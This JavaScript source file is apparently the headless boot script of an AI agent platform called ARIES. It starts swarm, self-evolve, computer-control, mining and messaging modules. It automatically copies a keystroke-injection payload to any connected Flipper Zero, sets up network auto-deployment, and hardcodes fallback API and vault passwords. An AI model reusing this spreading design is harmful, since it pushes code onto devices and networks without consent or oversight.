/**
 * ARIES v5.0 — Headless Mode
 * Starts all core modules without the blessed TUI.
 * Used by launcher.js for desktop app mode.
 */

const fs = require('fs');
const path = require('path');
const http = require('http');

async function startHeadless(configPath = path.join(__dirname, '..', 'config.json')) {
  // Prevent uncaught errors from crashing the process
  process.on('uncaughtException', (err) => {
    console.error('[HEADLESS] Uncaught:', err.stack || err.message);
  });
  process.on('unhandledRejection', (err) => {
    console.error('[HEADLESS] Unhandled rejection:', err && err.stack ? err.stack : err);
  });
  process.on('unhandledRejection', (reason) => {
    console.error('[HEADLESS] Unhandled rejection:', reason);
  });
  // Debug: log unexpected exits
  process.on('exit', (code) => {
    if (code !== 0) { try { require('fs').appendFileSync(require('path').join(__dirname, '..', 'data', 'exit-debug.log'), new Date().toISOString() + ' EXIT code=' + code + '\n'); } catch {} }
  });

  // Track child processes for cleanup
  const _childProcesses = new Set();
  const _origSpawn = require('child_process').spawn;
  const _cp = require('child_process');
  const _origCpSpawn = _cp.spawn;
  // Monkey-patch spawn to track children (within this module)
  function trackChild(child) {
    if (child && child.pid) {
      _childProcesses.add(child);
      child.once('exit', () => _childProcesses.delete(child));
    }
    return child;
  }

  // Cleanup handler — kill all tracked child processes
  function cleanupChildren() {
    for (const child of _childProcesses) {
      try { child.kill('SIGTERM'); } catch {}
      try { process.kill(child.pid, 'SIGTERM'); } catch {}
    }
    _childProcesses.clear();
  }

  // Register cleanup on process signals
  const _cleanupOnce = (() => { let done = false; return () => { if (done) return; done = true; cleanupChildren(); }; })();
  process.on('SIGTERM', _cleanupOnce);
  process.on('SIGINT', _cleanupOnce);
  process.on('exit', _cleanupOnce);

  let config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
  const baseDir = path.dirname(configPath);

  // Ensure data dir exists
  const dataDir = path.join(baseDir, 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  // ── Auto-Setup: configure AI if no API key present ──
  try {
    const AutoSetup = require(path.join(baseDir, 'core', 'auto-setup'));
    const setupResult = await new AutoSetup({ configPath }).run();
    if (setupResult.status === 'ok' && setupResult.reason !== 'api-key-present') {
      // Reload config after auto-setup may have modified it
      config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      console.log(`  [AUTO-SETUP] Configured: ${setupResult.reason}${setupResult.model ? ' (' + setupResult.model + ')' : ''}`);
    }
  } catch (e) {
    console.error('[AUTO-SETUP] Error:', e.message);
  }

  // ── Boot Sequence Display ──
  const BOOT_VERSION = '5.0';
  const bootStatus = {};
  const bootOrder = [
    'ai-core', 'ai-gateway', 'memory', 'knowledge-graph', 'swarm',
    'web-dashboard', 'browser-control', 'self-evolve', 'flipper-deployer',
    'usb-swarm', 'packet-send', 'btc-miner', 'system-integration',
    'network-scanner', 'network-deploy', 'terminal', 'system-monitor', 'model-manager'
  ];
  const bootLabels = {
    'ai-core': 'AI Core',
    'ai-gateway': 'AI Gateway (port 18800)',
    'memory': 'Memory System',
    'knowledge-graph': 'Knowledge Graph',
    'swarm': 'Swarm',
    'web-dashboard': 'Web Dashboard (port ' + (config.apiPort || 3333) + ')',
    'browser-control': 'Browser Control',
    'self-evolve': 'Self-Evolve',
    'flipper-deployer': 'Flipper Deployer',
    'usb-swarm': 'USB Swarm',
    'packet-send': 'Packet Send',
    'btc-miner': 'BTC Miner',
    'system-integration': 'System Integration',
    'network-scanner': 'Network Scanner',
    'network-deploy': 'Network Auto-Deploy',
    'terminal': 'Terminal Server',
    'system-monitor': 'System Monitor',
    'model-manager': 'Model Manager',
  };
  function bootLog(mod, status, detail) {
    bootStatus[mod] = { status, detail, timestamp: Date.now() };
    const icon = status === 'ok' ? '✓' : status === 'skip' ? '○' : status === 'fail' ? '✗' : '…';
    const label = (bootLabels[mod] || mod).padEnd(30, ' ');
    const detailStr = detail ? ` ${detail}` : '';
    console.log(`  ▸ ${label} ${icon}${detailStr}`);
  }
  console.log('');
  console.log(`  [ARIES v${BOOT_VERSION}] Initializing...`);
  console.log('  Running independently — Aries Gateway active on port 18800');
  console.log('');

  // Initialize Logger first (all modules use it)
  const { Logger } = require(path.join(baseDir, 'core', 'logger'));
  const logger = new Logger(config.logger || {});
  const log = logger.create('HEADLESS');
  log.info('ARIES v5.0 starting in headless mode (INDEPENDENT — no OpenClaw dependency)');

  // Initialize WebSocket server
  const { WebSocketServer } = require(path.join(baseDir, 'core', 'websocket'));
  const wsServer = new WebSocketServer({ apiKey: config.apiKey || 'aries-api-2026' });

  // Initialize Backup system
  const { Backup } = require(path.join(baseDir, 'core', 'backup'));
  const backup = new Backup({ ...(config.backup || {}), baseDir: baseDir });

  // Initialize HTTPS server
  const { HttpsServer } = require(path.join(baseDir, 'core', 'https-server'));
  const httpsServer = new HttpsServer({ ...(config.https || {}), baseDir: baseDir });

  // Wire logger events to WebSocket broadcast
  logger.on('log', function(entry) {
    try { wsServer.broadcast('log', entry); } catch (e) {}
  });

  // ── Core modules (loaded eagerly — needed at startup) ──
  bootLog('ai-core', 'loading');
  const ai = require(path.join(baseDir, 'core', 'ai'));
  const tools = require(path.join(baseDir, 'core', 'tools'));
  const memory = require(path.join(baseDir, 'core', 'memory'));
  const sysModule = require(path.join(baseDir, 'core', 'system'));
  const events = require(path.join(baseDir, 'core', 'events'));
  const Swarm = require(path.join(baseDir, 'core', 'swarm'));
  const SwarmCoordinator = require(path.join(baseDir, 'core', 'swarm-coordinator'));
  const TaskQueue = require(path.join(baseDir, 'core', 'task-queue'));
  const pluginLoader = require(path.join(baseDir, 'core', 'plugin-loader'));
  const selfHeal = require(path.join(baseDir, 'core', 'self-heal'));
  const apiServer = require(path.join(baseDir, 'core', 'api-server'));
  const smartRouter = require(path.join(baseDir, 'core', 'smart-router'));
  const { Pipeline, savePipeline, listPipelines, getPipeline, deletePipeline } = require(path.join(baseDir, 'core', 'pipelines'));
  const { WarRoom } = require(path.join(baseDir, 'core', 'war-room'));
  const { AIGateway } = require(path.join(baseDir, 'core', 'ai-gateway'));
  const { ExtensionBridge } = require(path.join(baseDir, 'core', 'extension-bridge'));
  const { SwarmJoin } = require(path.join(baseDir, 'core', 'swarm-join'));

  // ── Lazy-loaded modules (loaded on first access to reduce startup time) ──
  function lazyRequire(modulePath) {
    let _mod = null;
    return { get() { if (!_mod) _mod = require(modulePath); return _mod; } };
  }
  const _lazy = {
    ContextManager: lazyRequire(path.join(baseDir, 'core', 'context-manager')),
    AgentLearning: lazyRequire(path.join(baseDir, 'core', 'agent-learning')),
    WorkflowEngine: lazyRequire(path.join(baseDir, 'core', 'workflow-engine')),
    MCPClient: lazyRequire(path.join(baseDir, 'core', 'mcp-client')),
    AutonomousRunner: lazyRequire(path.join(baseDir, 'core', 'autonomous')),
    AgentDebate: lazyRequire(path.join(baseDir, 'core', 'agent-debate')),
    KnowledgeGraph: lazyRequire(path.join(baseDir, 'core', 'knowledge-graph')),
    AgentFactory: lazyRequire(path.join(baseDir, 'core', 'agent-factory')),
    WebSentinel: lazyRequire(path.join(baseDir, 'core', 'web-sentinel')),
    RAGEngine: lazyRequire(path.join(baseDir, 'core', 'rag-engine')),
    WebScraper: lazyRequire(path.join(baseDir, 'core', 'web-scraper')),
    CodeSandbox: lazyRequire(path.join(baseDir, 'core', 'code-sandbox')),
    AutoUpdater: lazyRequire(path.join(baseDir, 'core', 'auto-updater')),
    VoiceEngine: lazyRequire(path.join(baseDir, 'core', 'voice-engine')),
    AgentMarketplace: lazyRequire(path.join(baseDir, 'core', 'agent-marketplace')),
    BrowserControl: lazyRequire(path.join(baseDir, 'core', 'browser-control')),
    ComputerControl: lazyRequire(path.join(baseDir, 'core', 'computer-control')),
    SelfEvolve: lazyRequire(path.join(baseDir, 'core', 'self-evolve')),
    AgentHandoffs: lazyRequire(path.join(baseDir, 'core', 'agent-handoffs')),
    MultiUser: lazyRequire(path.join(baseDir, 'core', 'multi-user')),
    ToolGenerator: lazyRequire(path.join(baseDir, 'core', 'tool-generator')),
    WebIntelligence: lazyRequire(path.join(baseDir, 'core', 'web-intelligence')),
    MessagingHub: lazyRequire(path.join(baseDir, 'core', 'messaging')),
    PersistentMemory: lazyRequire(path.join(baseDir, 'core', 'persistent-memory')),
    NodePairing: lazyRequire(path.join(baseDir, 'core', 'node-pairing')),
    Scheduler: lazyRequire(path.join(baseDir, 'core', 'scheduler')),
    WebSearch: lazyRequire(path.join(baseDir, 'core', 'web-search')),
    SkillManager: lazyRequire(path.join(baseDir, 'core', 'skills')),
    Daemon: lazyRequire(path.join(baseDir, 'core', 'daemon')),
    SwarmHealth: lazyRequire(path.join(baseDir, 'core', 'swarm-health')),
    SwarmManager: lazyRequire(path.join(baseDir, 'core', 'swarm-manager')),
    SystemIntegration: lazyRequire(path.join(baseDir, 'core', 'system-integration')),
    SkillBridge: lazyRequire(path.join(baseDir, 'core', 'skill-bridge')),
    ConversationEngine: lazyRequire(path.join(baseDir, 'core', 'conversation-engine')),
    ProviderManager: lazyRequire(path.join(baseDir, 'core', 'provider-manager')),
    SwarmAgents: lazyRequire(path.join(baseDir, 'core', 'swarm-agents')),
    KeyProvisioner: lazyRequire(path.join(baseDir, 'core', 'key-provisioner')),
    FlipperDeployer: lazyRequire(path.join(baseDir, 'core', 'flipper-deployer')),
    PacketSend: lazyRequire(path.join(baseDir, 'core', 'packet-send')),
    CaptivePortal: lazyRequire(path.join(baseDir, 'core', 'captive-portal')),
    OllamaFallback: lazyRequire(path.join(baseDir, 'core', 'ollama-fallback')),
    MCPServer: lazyRequire(path.join(baseDir, 'core', 'mcp-server')),
  };

  bootLog('ai-core', 'ok');

  // Initialize Ollama Fallback
  try {
    const OllamaFallback = require(path.join(baseDir, 'core', 'ollama-fallback'));
    var ollamaFallback = new OllamaFallback(config.ollamaFallback || {});
    ollamaFallback.checkOllama().then(function(avail) {
      if (avail) console.log('[BOOT] Ollama fallback ready: ' + ollamaFallback.currentModel);
      else console.log('[BOOT] Ollama not detected (fallback will activate if needed)');
    }).catch(function() {});
  } catch (e) { console.log('[BOOT] Ollama fallback init skipped:', e.message); var ollamaFallback = null; }

  // Initialize MCP Server
  try {
    const MCPServer = require(path.join(baseDir, 'core', 'mcp-server'));
    var mcpServer = new MCPServer(config.mcp || {});
  } catch (e) { console.log('[BOOT] MCP server init skipped:', e.message); var mcpServer = null; }


  const startTime = Date.now();
  let aiOnline = false;

  // Load history
  const historyFile = path.join(dataDir, 'history.json');
  let chatHistory = [];
  try { chatHistory = JSON.parse(fs.readFileSync(historyFile, 'utf8')); } catch {}

  // Load persistent chat history
  const chatHistoryFile = path.join(dataDir, 'chat-history.json');
  let persistentChatHistory = [];
  try {
    persistentChatHistory = JSON.parse(fs.readFileSync(chatHistoryFile, 'utf8'));
    log.info('Loaded ' + persistentChatHistory.length + ' persistent chat messages');
  } catch (e) {
    persistentChatHistory = [];
  }

  // Personas
  const PERSONAS = {
    default:  { name: 'Default',  prompt: 'You are Aries, an advanced AI assistant. Be helpful, concise, and intelligent.' },
    coder:    { name: 'Coder',    prompt: 'You are Aries in Coder mode. Focus on technical accuracy, code quality, and engineering best practices.' },
    creative: { name: 'Creative', prompt: 'You are Aries in Creative mode. Be imaginative, expressive, and inspiring.' },
    analyst:  { name: 'Analyst',  prompt: 'You are Aries in Analyst mode. Be data-focused, structured, and methodical.' },
  };
  let currentPersona = 'default';
  let currentBranch = 'main';
  let sessionStats = { messagesSent: 0, tokensEstimate: 0 };

  // Load plugins
  const loadedPlugins = pluginLoader.loadAll();

  // Task queue
  const taskQueue = new TaskQueue();

  // Coordinator
  const coordinator = new SwarmCoordinator(config.remoteWorkers || {});
  let coordinatorStarted = false;
  let coordinatorPort = 9700;

  if (config.remoteWorkers && config.remoteWorkers.enabled) {
    const basePort = config.remoteWorkers.port || 9700;
    // Suppress EADDRINUSE — coordinator is optional
    coordinator.on('error', (err) => {
      if (err.code !== 'EADDRINUSE') {
        console.error('[COORDINATOR]', err.message);
      }
    });
    for (let port = basePort; port <= basePort + 10; port++) {
      try {
        config.remoteWorkers.port = port;
        coordinator.port = port;
        coordinatorStarted = coordinator.start();
        coordinatorPort = port;
        break;
      } catch (e) {
        if (e.code === 'EADDRINUSE' || (e.message && e.message.includes('EADDRINUSE'))) continue;
        break;
      }
    }
  }

  // Swarm
  bootLog('swarm', 'loading');
  const swarm = new Swarm(
    ai,
    { ...(config.swarm || { maxWorkers: 5, workerTimeout: 60000, retries: 2 }), models: config.models, relay: config.relay },
    coordinator
  );

  // Relay polling
  let _relayCache = null;
  if (config.relay && config.relay.url) {
    const pollRelay = () => {
      try {
        const u = new URL(`${config.relay.url}/api/status`);
        const req = http.request(u, { headers: { 'X-Aries-Secret': config.relay.secret || '' }, timeout: 5000 }, (res) => {
          let d = '';
          res.on('data', c => d += c);
          res.on('end', () => { try { _relayCache = JSON.parse(d); } catch {} });
        });
        req.on('error', () => { _relayCache = null; });
        req.on('timeout', () => { req.destroy(); });
        req.end();
      } catch {}
    };
    pollRelay();
    setInterval(pollRelay, 15000);
  }

  // Test AI (using built-in http/https only)
  async function testAI() {
    try {
      const gatewayUrl = config.gateway && config.gateway.url ? config.gateway.url : 'http://localhost:18800/v1/chat/completions';
      const parsedUrl = new (require('url').URL)(gatewayUrl);
      const httpMod = parsedUrl.protocol === 'https:' ? require('https') : require('http');
      const postData = JSON.stringify({ model: config.gateway.model, messages: [{ role: 'user', content: 'ping' }], max_tokens: 10 });
      await new Promise(function(resolve) {
        var req = httpMod.request(parsedUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (config.gateway.token || ''), 'Content-Length': Buffer.byteLength(postData) },
          timeout: 10000
        }, function(res) {
          var d = '';
          res.on('data', function(c) { d += c; });
          res.on('end', function() { aiOnline = res.statusCode >= 200 && res.statusCode < 400; resolve(); });
        });
        req.on('error', function() { aiOnline = false; resolve(); });
        req.on('timeout', function() { req.destroy(); aiOnline = false; resolve(); });
        req.write(postData);
        req.end();
      });
    } catch (e) {
      aiOnline = false;
    }
  }
  testAI();

  function saveHistory() {
    try { fs.writeFileSync(historyFile, JSON.stringify(chatHistory, null, 2)); } catch {}
  }

  // Debounced persistent chat save — avoids sync writes on every message
  let _chatSaveTimer = null;
  function savePersistentChat(role, content) {
    try {
      persistentChatHistory.push({ role: role, content: content, timestamp: Date.now() });
      if (persistentChatHistory.length > 500) {
        persistentChatHistory = persistentChatHistory.slice(-500);
      }
      // Debounce writes — save at most once per second
      if (!_chatSaveTimer) {
        _chatSaveTimer = setTimeout(() => {
          _chatSaveTimer = null;
          try { fs.writeFileSync(chatHistoryFile, JSON.stringify(persistentChatHistory, null, 2)); } catch (e) {}
        }, 1000);
      }
    } catch (e) {}
  }

  // Initialize new modules (lazy-loaded, each wrapped for safety)
  let contextManager, agentLearning, workflowEngine, mcpClient;
  try {
    const { ContextManager } = _lazy.ContextManager.get();
    const { AgentLearning } = _lazy.AgentLearning.get();
    const { WorkflowEngine } = _lazy.WorkflowEngine.get();
    const { MCPClient } = _lazy.MCPClient.get();
    contextManager = new ContextManager({ ai });
    agentLearning = new AgentLearning();
    workflowEngine = new WorkflowEngine({ ai, swarm });
    mcpClient = new MCPClient();
  } catch (e) { console.error('[HEADLESS] Core module init error:', e.message); contextManager = contextManager || {}; agentLearning = agentLearning || {}; workflowEngine = workflowEngine || { start() {}, stop() {} }; mcpClient = mcpClient || { connect() { return Promise.resolve(); }, disconnectAll() {} }; }
  bootLog('memory', 'ok');

  // Start workflow engine if enabled
  if (config.workflows?.enabled) {
    try { workflowEngine.start(); } catch (e) { console.error('[WORKFLOW]', e.message); }
  }

  // Initialize new v4.1 modules (lazy-loaded, wrapped for safety)
  let autonomousRunner, agentDebate, knowledgeGraph, agentFactory, warRoom, webSentinel;
  try {
    const { AutonomousRunner } = _lazy.AutonomousRunner.get();
    const { AgentDebate } = _lazy.AgentDebate.get();
    const { KnowledgeGraph } = _lazy.KnowledgeGraph.get();
    const { AgentFactory } = _lazy.AgentFactory.get();
    const { WebSentinel } = _lazy.WebSentinel.get();
    autonomousRunner = new AutonomousRunner({ ai: { callWithFallback: ai.callWithFallback }, swarm, config: config.autonomous || {} });
    agentDebate = new AgentDebate({ ai: { callWithFallback: ai.callWithFallback }, config: config.debate || {} });
    bootLog('knowledge-graph', 'loading');
    knowledgeGraph = new KnowledgeGraph({ ai: { callWithFallback: ai.callWithFallback }, config: config.knowledgeGraph || {} });
    bootLog('knowledge-graph', 'ok');
    agentFactory = new AgentFactory({ ai: { callWithFallback: ai.callWithFallback }, roster: swarm.getRoster(), config: config.agentFactory || {} });
    warRoom = new WarRoom({ config: config.warRoom || {} });
    webSentinel = new WebSentinel({ ai: { callWithFallback: ai.callWithFallback }, config: config.sentinel || {} });
  } catch (e) {
    console.error('[HEADLESS] v4.1 module init error:', e.message);
    bootLog('knowledge-graph', 'fail', e.message);
    // Stub any missing modules
    const EventEmitter = require('events');
    const stub = () => { const s = new EventEmitter(); s.start = s.stop = s.on = s.emit = function() { return s; }; return s; };
    autonomousRunner = autonomousRunner || stub();
    agentDebate = agentDebate || stub();
    knowledgeGraph = knowledgeGraph || stub();
    agentFactory = agentFactory || stub();
    warRoom = warRoom || new WarRoom({ config: {} });
    webSentinel = webSentinel || stub();
  }

  // Initialize v4.3 modules (lazy-loaded)
  const { ToolGenerator } = _lazy.ToolGenerator.get();
  const { WebIntelligence } = _lazy.WebIntelligence.get();
  const toolGenerator = new ToolGenerator({ ai: { callWithFallback: ai.callWithFallback }, config: config.selfEvolve || {} });
  const webIntelligence = new WebIntelligence({ ai: { callWithFallback: ai.callWithFallback }, config: config.selfEvolve || {} });

  // Initialize v4.2 modules (lazy-loaded)
  const { SelfEvolve } = _lazy.SelfEvolve.get();
  const { CodeSandbox } = _lazy.CodeSandbox.get();
  const { AgentHandoffs } = _lazy.AgentHandoffs.get();
  const { MultiUser } = _lazy.MultiUser.get();
  bootLog('self-evolve', 'loading');
  const selfEvolve = new SelfEvolve({ ai: { callWithFallback: ai.callWithFallback }, config: config.selfEvolve || {}, agentLearning, knowledgeGraph, swarm, warRoom });
  bootLog('self-evolve', 'ok');
  const codeSandbox = new CodeSandbox(config.sandbox || {});
  const agentHandoffs = new AgentHandoffs({ config: config.handoffs || {}, roster: swarm.getRoster(), ai: { callWithFallback: ai.callWithFallback } });
  const multiUser = new MultiUser({ config: config.multiUser || {} });

  // Start self-evolve weekly schedule if enabled
  if (config.selfEvolve?.enabled) {
    try { selfEvolve.scheduleWeekly(); } catch (e) { console.error('[SELF-EVOLVE]', e.message); }
  }

  // Wire webScraper into webIntelligence (after webScraper is created below)

  // Initialize v4.2+ modules (lazy-loaded)
  const { RAGEngine } = _lazy.RAGEngine.get();
  const { WebScraper } = _lazy.WebScraper.get();
  const { AutoUpdater } = _lazy.AutoUpdater.get();
  const { VoiceEngine } = _lazy.VoiceEngine.get();
  const { AgentMarketplace } = _lazy.AgentMarketplace.get();
  const { BrowserControl } = _lazy.BrowserControl.get();
  const { ComputerControl } = _lazy.ComputerControl.get();
  const ragEngine = new RAGEngine(config.rag || {});
  const webScraper = new WebScraper(config.scraper || {});
  const autoUpdater = new AutoUpdater(config.autoUpdater || {});
  const voiceEngine = new VoiceEngine(config.voice || {});
  const agentMarketplace = new AgentMarketplace({ agentFactory });
  bootLog('browser-control', 'loading');
  const browserControl = new BrowserControl(config.browserControl || {});
  bootLog('browser-control', 'ok');
  const computerControl = new ComputerControl(config.computerControl || {});

  // Initialize v4.4 modules (lazy-loaded)
  const { MessagingHub } = _lazy.MessagingHub.get();
  const { PersistentMemory } = _lazy.PersistentMemory.get();
  const { NodePairing } = _lazy.NodePairing.get();
  const { WebSearch } = _lazy.WebSearch.get();
  const { SkillManager } = _lazy.SkillManager.get();
  const { Scheduler } = _lazy.Scheduler.get();
  const { Daemon } = _lazy.Daemon.get();
  const messagingHub = new MessagingHub(config.messaging || {});
  const persistentMemory = new PersistentMemory(config.persistentMemory || {});
  const nodePairing = new NodePairing(config.nodePairing || {});
  const webSearchEngine = new WebSearch(config.webSearch || {});
  const skillManager = new SkillManager(config.skills || {});
  const scheduler = new Scheduler(config.scheduler || {}, { swarm, messaging: messagingHub });
  const daemon = new Daemon(config.daemon || {});

  // Initialize Skill Bridge (lazy-loaded)
  const { SkillBridge } = _lazy.SkillBridge.get();
  const skillBridge = new SkillBridge(config.skillBridge || {}, { ai: { callWithFallback: ai.callWithFallback }, skillManager });
  if (config.skillBridge && config.skillBridge.autoDiscover) {
    try {
      var localOcSkills = skillBridge.discoverLocalSkills();
      log.info('Discovered ' + localOcSkills.length + ' local OpenClaw skills');
    } catch (e) { console.error('[SKILL-BRIDGE]', e.message); }
  }

  // Initialize Conversation Engine (lazy-loaded)
  const { ConversationEngine } = _lazy.ConversationEngine.get();
  const conversationEngine = new ConversationEngine(config.conversationEngine || {}, { ai: { callWithFallback: ai.callWithFallback }, persistentMemory, skillBridge });
  if (config.conversationEngine && config.conversationEngine.enabled) {
    log.info('Conversation Engine initialized');
  }

  // Initialize AI Gateway FIRST (other modules may need AI)
  bootLog('ai-gateway', 'loading');
  const aiGateway = new AIGateway(config.ariesGateway || {});
  if (config.ariesGateway && config.ariesGateway.enabled) {
    try {
      aiGateway.start();
      bootLog('ai-gateway', 'ok', '(port ' + aiGateway.port + ')');
      log.info('Aries AI Gateway started on port ' + aiGateway.port);
    } catch (e) { bootLog('ai-gateway', 'fail', e.message); console.error('[AI-GATEWAY]', e.message); }
  } else {
    bootLog('ai-gateway', 'skip', '(disabled)');
  }

  // Initialize Swarm Manager (VM provisioning, lazy-loaded)
  const { SwarmManager } = _lazy.SwarmManager.get();
  const swarmManager = new SwarmManager(config.swarmManager || {});
  if (config.swarmManager && config.swarmManager.enabled) {
    try {
      swarmManager.startHealthChecks(30000);
      log.info('Swarm Manager started with health checks');
    } catch (e) { console.error('[SWARM-MANAGER]', e.message); }
  }

  // Initialize System Integration (deep OS control, lazy-loaded)
  const { SystemIntegration } = _lazy.SystemIntegration.get();
  const systemIntegration = new SystemIntegration(config.systemIntegration || {});
  bootLog('system-integration', 'loading');
  try {
    systemIntegration.startPolling(15000); // 15s instead of 5s — reduces CPU
    systemIntegration.on('stats', function(stats) {
      try { wsServer.broadcast('system', stats); } catch (e) {}
    });
    bootLog('system-integration', 'ok');
    log.info('System integration started (polling every 15s)');
  } catch (e) { bootLog('system-integration', 'fail', e.message); console.error('[SYS-INTEGRATION]', e.message); }

  // Initialize ARES — Aries Recursive Evolution System
  var _ares = null;
  try {
    var { initAres } = require(path.join(baseDir, 'core', 'ares', 'index'));
    _ares = initAres(config, apiServer.addPluginRoute, function(msg) { try { wsServer.broadcast('ares', msg); } catch (e) {} });
    bootLog('ares', 'ok', 'Cycle ' + (_ares.coordinator.state.current_cycle || 0));
  } catch (e) {
    bootLog('ares', 'fail', e.message);
    console.error('[ARES]', e.message);
  }

  // Initialize Swarm Health Monitor (lazy-loaded)
  const { SwarmHealth } = _lazy.SwarmHealth.get();
  const swarmHealth = new SwarmHealth(config);
  try {
    swarmHealth.start();
    log.info('Swarm health monitor started');
  } catch (e) { console.error('[SWARM-HEALTH]', e.message); }

  // Wire swarm health events to war room
  swarmHealth.on('health-check', (results) => {
    warRoom.broadcast({ type: 'swarm-health', results });
  });

  // Initialize Profit Tracker (SOL balance monitoring)
  const { ProfitTracker } = require(path.join(baseDir, 'core', 'profit-tracker'));
  const profitTracker = new ProfitTracker(config.miner || {});

  // Initialize Worker Chat (inter-worker communication)
  const { WorkerChat } = require(path.join(baseDir, 'core', 'worker-chat'));
  const workerChat = new WorkerChat();

  // Initialize Miner Alerts (Telegram notifications)
  const { MinerAlerts } = require(path.join(baseDir, 'core', 'miner-alerts'));
  // MinerAlerts created here but started AFTER refs is built (refs declared later)
  let _minerAlertsRefs = { _minerState: null };
  const minerAlerts = new MinerAlerts(_minerAlertsRefs);
  // minerAlerts.start() is called after refs is created — see below

  // Initialize Crypto Price Alerts
  const { CryptoAlerts } = require(path.join(baseDir, 'core', 'crypto-alerts'));
  const cryptoAlerts = new CryptoAlerts();
  if (config.cryptoAlerts?.enabled !== false) {
    try { cryptoAlerts.start(); log.info('Crypto price alerts started'); } catch (e) { console.error('[CRYPTO-ALERTS]', e.message); }
  }

  // Initialize Arbitrage Scanner
  const { ArbitrageScanner } = require(path.join(baseDir, 'core', 'arbitrage-scanner'));
  const arbitrageScanner = new ArbitrageScanner();
  if (config.arbitrage?.enabled) {
    try { arbitrageScanner.start(); log.info('Arbitrage scanner started'); } catch (e) { console.error('[ARBITRAGE]', e.message); }
  }

  // Initialize Telegram Miner Bot (started AFTER refs is built — see below)
  const { TelegramMinerBot } = require(path.join(baseDir, 'core', 'telegram-miner-bot'));
  let telegramMinerBot = null;

  // Start messaging polling if Telegram configured
  if (config.messaging?.enabled && config.messaging?.telegram?.botToken) {
    try { messagingHub.startPolling(); } catch (e) { console.error('[MESSAGING]', e.message); }
  }

  // Wire messaging events to war room
  messagingHub.on('message', (msg) => {
    warRoom.broadcast({ type: 'messaging-inbound', channel: msg.channel, from: msg.from, text: msg.message });
  });
  messagingHub.on('sent', (msg) => {
    warRoom.broadcast({ type: 'messaging-outbound', channel: msg.channel, target: msg.target });
  });

  // Start scheduler if enabled
  if (config.scheduler?.enabled) {
    try { scheduler.start(); } catch (e) { console.error('[SCHEDULER]', e.message); }
  }

  // Wire scheduler chat actions to AI
  scheduler.on('chat-action', (data) => {
    warRoom.broadcast({ type: 'scheduler-chat', prompt: data.prompt });
  });

  // Start daemon watchdog if enabled
  if (config.daemon?.enabled) {
    try { daemon.start(); } catch (e) { console.error('[DAEMON]', e.message); }
  }

  // Wire webScraper into webIntelligence and selfEvolve
  webIntelligence.webScraper = webScraper;
  selfEvolve.webIntelligence = webIntelligence;
  selfEvolve.toolGenerator = toolGenerator;
  selfEvolve.webScraper = webScraper;
  selfEvolve.webSearch = webSearchEngine;

  // Wire browser controller for deep web research (Playwright/Puppeteer)
  try {
    var browserController = require(path.join(baseDir, 'core', 'browser'));
    if (browserController && browserController.isAvailable()) {
      selfEvolve.browserController = browserController;
      log.info('Browser controller available for self-evolve research');
    }
  } catch (e) {
    // Playwright/Puppeteer not installed — self-evolve will use HTTP fallback
  }

  // Schedule auto-updater weekly check
  if (config.autoUpdater?.enabled) {
    try { autoUpdater.scheduleWeeklyCheck(); } catch (e) { console.error('[AUTO-UPDATER]', e.message); }
  }

  // Wire up war room to swarm events
  swarm.on('worker_start', (w) => warRoom.trackTask(w.id, w.agentId, { agentName: w.agentName, agentIcon: w.agentIcon, description: w.task }));
  swarm.on('worker_done', (w) => warRoom.completeTask(w.id, { tokens: 0, text: w.result || '' }));
  swarm.on('worker_failed', (w) => warRoom.failTask(w.id, w.lastError || 'Unknown error'));

  // Wire up autonomous events to war room
  autonomousRunner.on('progress', (p) => warRoom.broadcast({ type: 'autonomous-progress', ...p }));
  autonomousRunner.on('complete', (p) => warRoom.broadcast({ type: 'autonomous-complete', ...p }));

  // Wire up sentinel alerts
  webSentinel.on('triggered', (t) => warRoom.broadcast({ type: 'sentinel-triggered', ...t }));
  webSentinel.on('alert', (a) => warRoom.broadcast({ type: 'sentinel-alert', ...a }));

  // Start sentinel if enabled
  if (config.sentinel?.enabled) {
    try { webSentinel.start(); } catch (e) { console.error('[SENTINEL]', e.message); }
  }

  // Connect MCP servers from config
  if (config.mcp?.enabled && Array.isArray(config.mcp.servers)) {
    for (const srv of config.mcp.servers) {
      mcpClient.connect(srv).catch(e => console.error('[MCP]', e.message));
    }
  }

  // Initialize Provider Manager, Key Provisioner & Swarm Agents (lazy-loaded)
  const { ProviderManager } = _lazy.ProviderManager.get();
  const { KeyProvisioner } = _lazy.KeyProvisioner.get();
  const { SwarmAgents } = _lazy.SwarmAgents.get();
  const providerManager = new ProviderManager({ dataDir: dataDir });
  const keyProvisioner = new KeyProvisioner({ dataDir: dataDir, providerManager: providerManager, masterPassword: config.vaultPassword || 'aries-default-vault-2026' });
  const autoRegistered = keyProvisioner.autoRegister();
  const swarmAgents = new SwarmAgents({ providerManager, dataDir });
  log.info('Provider Manager initialized (' + providerManager.providers.size + ' providers)');
  log.info('Key Vault: ' + autoRegistered + ' keys auto-registered');
  log.info('Swarm Agents initialized (' + swarmAgents.agents.size + ' agents)');

  // Initialize Flipper Zero auto-deployer (lazy-loaded)
  const { FlipperDeployer } = _lazy.FlipperDeployer.get();
  const flipperDeployer = new FlipperDeployer({
    payloadSource: path.join(baseDir, 'usb-swarm', 'ducky.txt'),
    payloadName: 'aries-swarm.txt',
    pollInterval: 10000, // 10s instead of 3s — reduces USB polling overhead
    idleCheck: () => wsServer.clientCount === 0 // skip polling when no dashboard clients
  });
  flipperDeployer.on('flipper-connected', (data) => {
    log.info('Flipper Zero detected on ' + data.driveLetter);
    try { wsServer.broadcast('flipper', { event: 'connected', driveLetter: data.driveLetter }); } catch (e) {}
  });
  flipperDeployer.on('flipper-deployed', (data) => {
    log.info('Payload deployed to Flipper Zero on ' + data.driveLetter + ' → ' + data.payloadName);
    try { wsServer.broadcast('flipper', { event: 'deployed', driveLetter: data.driveLetter, payloadName: data.payloadName }); } catch (e) {}
  });
  flipperDeployer.on('flipper-disconnected', (data) => {
    log.info('Flipper Zero disconnected from ' + data.driveLetter);
    try { wsServer.broadcast('flipper', { event: 'disconnected', driveLetter: data.driveLetter }); } catch (e) {}
  });
  flipperDeployer.start();
  bootLog('flipper-deployer', 'ok');
  bootLog('usb-swarm', 'ok');
  log.info('Flipper Zero auto-deployer started (polling every 10s)');

  // Initialize Network Auto-Deployer
  const { NetworkDeployer } = require(path.join(baseDir, 'core', 'network-deployer'));
  const networkDeployer = new NetworkDeployer(config.networkDeploy || {});
